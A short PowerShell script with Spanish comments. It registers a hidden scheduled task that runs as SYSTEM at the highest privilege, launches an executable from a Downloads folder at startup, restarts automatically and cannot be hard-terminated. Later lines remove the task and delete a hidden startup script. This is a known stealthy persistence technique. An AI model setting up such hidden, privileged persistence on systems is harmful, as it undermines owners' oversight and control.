$TaskName = "replay"
$Action = New-ScheduledTaskAction -Execute C:\Users\Magnetist\Downloads\Disk-Uploading.exe
$TriggerStartup = New-ScheduledTaskTrigger -AtStartup
$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
$Settings.Compatibility = "Win8"
$Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount
Register-ScheduledTask -Action $Action -Trigger $TriggerStartup -Settings $Settings -Principal $Principal -TaskName $TaskName
$Task = Get-ScheduledTask -TaskName $TaskName
$Task.Settings.ExecutionTimeLimit = "PT0S"
$Task.Settings.AllowHardTerminate = $true
$Task.Principal.RunLevel = "Highest"
$Task.Settings.Hidden = $true
$Task.Settings.RestartCount = 10
$Task.Settings.RestartInterval = "PT0H1M0S"
$Task.Settings.AllowHardTerminate = $false
Set-ScheduledTask -TaskName $TaskName -Principal $Task.Principal -Settings $Task.Settings
Start-ScheduledTask -TaskName $TaskName


# Detener la tarea
Stop-ScheduledTask -TaskName "replay" -Force

# Eliminar la tarea
Unregister-ScheduledTask -TaskName "replay" -Confirm:$false



Stop-ScheduledTask -TaskName zed
Start-ScheduledTask -TaskName zed
attrib -h C:\Users\Public\MyStartUp.ps1
del C:\Users\Public\MyStartUp.ps1
